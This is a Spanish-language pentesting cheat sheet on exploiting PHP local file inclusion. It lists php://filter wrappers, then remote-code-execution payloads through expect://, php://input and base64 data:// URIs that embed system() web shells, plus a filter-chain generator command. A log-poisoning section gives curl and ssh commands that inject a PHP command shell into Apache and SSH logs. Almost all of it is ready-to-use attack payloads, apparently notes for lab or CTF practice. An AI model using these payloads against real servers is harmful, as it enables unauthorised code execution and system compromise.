
## Wrappers:
- php://filter/convert.base64-encode/resource=
- php://filter/read=string.rot13/resource=
- php://filter/convert.iconv.utf-8.utf-16/resource=
## Wrappers para RCE:
- (GET)expect://whoami.
- (Cualquiera de los 2):
(Head)
POST /?filename=php://input HTTP/1.1
(Body)
<?php system ("whoami"); ?>
- (GET) /?filename=data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTsgPz4=
- (GET) /?filename=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2b&cmd=whoami (Hay que encodear la cadena en base64).
- Usando la tool de este repo: https://github.com/synacktiv/php_filter_chain_generator
Podemos generar cadenas falopa las cuales nos permiten hacer RCEs.
python3 php_filter_chain_generator.py --chain '<?php system("whoami"); ?>'

## Log Poisoning
Hay que tener cuidado con esta tecnica ya que si escribimos mal los comando o ponemos mal las comillas podemos contaminar por completo el log y asi lo dejariamos de leer evitando que interprete nuestro codigo.
Comandos bien escritos:
==/var/log/apache2/access.log== (Logs de apache)
curl -s -X GET "http://localhost/probando" -H "User-Agent: <?php system('whoami'); ?>"
curl -s -X GET "http://localhost/probando" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
==/var/log/btmp== (Logs de ssh)
ssh '<?php system($_GET["cmd"]); ?>'@172.17.0.2